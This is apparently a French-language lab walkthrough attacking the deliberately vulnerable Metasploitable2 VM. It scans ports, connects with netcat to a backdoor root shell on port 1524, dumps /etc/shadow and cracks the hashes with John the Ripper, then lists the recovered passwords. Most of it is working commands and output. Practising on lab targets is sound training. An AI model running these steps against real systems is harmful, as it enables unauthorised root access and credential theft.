# Metasploitable2-linu**x**

**👁️** **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     
by M0rPH3U53

      
[i] IP: 192.168.56.253
[i] Rate: 1000
 
🔥 Masscan 192.168.56.253...100%
👁️ Nmap 192.168.56.253...100%
 
[+] 3632/tcp open
[+] 5432/tcp open
[+] 512/tcp open
[+] 139/tcp open
[+] 25/tcp open
[+] 44284/tcp open
[+] 23/tcp open
[+] 111/tcp open
[+] 53/tcp open
[+] 8009/tcp open
[+] 2121/tcp open
[+] 2049/tcp open
[+] 5900/tcp open
[+] 6697/tcp open
[+] 1099/tcp open
[+] 21/tcp open
[+] 1524/tcp open
[+] 55623/tcp open
[+] 35598/tcp open
[+] 80/tcp open
[+] 22/tcp open
[+] 8180/tcp open
[+] 8787/tcp open
[+] 6667/tcp open
[+] 6000/tcp open
[+] 514/tcp open
[+] 43677/tcp open
[+] 513/tcp open
[+] 445/tcp open
[+] 3306/tcp open

==========================================================
|                         📑 Rapport                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.253-tcp.html     |
==========================================================
```

&nbsp;

**📑 Rapport**

Un port identifier qui nous donne un shell root

<img width="886" height="22" alt="db93f2e00aead0cf08a09c367b155c95" src="https://github.com/user-attachments/assets/964ac789-535f-4e3f-a055-2c8fb948ab9c" />

&nbsp;

**<span style="color: #dddddd;">🐾</span> nc**

Connexion au port `1524`

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $nc 192.168.56.253 1524
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root) 
```

&nbsp;

🔒**Shadow**

Hash des users

```
root@metasploitable:/# cat /etc/shadow | grep '$1'
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
```

&nbsp;

**🧨** **JohnTheRipper**

Crack des hash utilisateurs

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 5 password hash
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
root        (root)
sys         (batman)
klog        (123456789)
postgres    (postgres)
user        (user)
service     (service)
1g 0:00:00:00 DONE 2/2 (2025-01-15 18:59) 1.724g/s 165.5p/s 165.5c/s 165.5C/s 123456789..999995
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john --show hash
root:root:14747:0:99999:7:::
sys:batman:14742:0:99999:7:::
klog:123456789:14742:0:99999:7:::
postgres:postgres:14685:0:99999:7:::
user:user:14699:0:99999:7:::
service:service:14715:0:99999:7:::
5 password hashes cracked, 0 left
```

&nbsp;

**💯 Identifiants**

| User | Password |
| --- | --- |
| service | service |
| root | root |
| postgres | postgres |
| sys | batman |
| msfadmin | msfadmin |
| user | user |
| klog | 123456789 |
